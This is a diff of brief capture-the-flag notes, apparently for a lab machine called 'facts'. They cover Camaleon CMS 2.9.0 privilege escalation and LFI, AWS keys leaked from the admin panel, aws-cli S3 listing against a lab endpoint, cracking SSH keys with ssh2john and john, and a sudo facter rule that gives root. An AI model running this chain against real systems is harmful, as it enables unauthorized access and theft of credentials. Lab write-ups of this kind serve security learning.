@@ -21,16 +21,24 @@ dave
 
 Camaleon CMS - version 2.9.0 - multiple vulns - privesc usr to admin - lfi 
 
-Admin leaks - aws things accessid and secrect keys
+Admin leaks - aws things accessid and secrect keys, endpoint running
 
-Using aws-cli cmds - got two buckets one gives ssh keys cracking that gives
+Using aws-cli cmds - got two buckets one gives ssh keys cracking that gives;
 
 one users passwd
+
+aws configure --profile factshtb 
+
+aws --endpoint-url http://10.129.22.137:54321 s3 ls --profile cybr
+
+ssh2john id_ed25519 > ssh.hash
+john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules
 
 user to root;
 
 (ALL) NOPASSWD: /usr/bin/facter
 
+`
 trivia@facts:~$ sudo -l
 Matching Defaults entries for trivia on facts:
     env_reset, mail_badpass,
@@ -47,4 +55,4 @@ root@facts:~# id
 uid=0(root) gid=0(root) groups=0(root)
 
 
-
+`
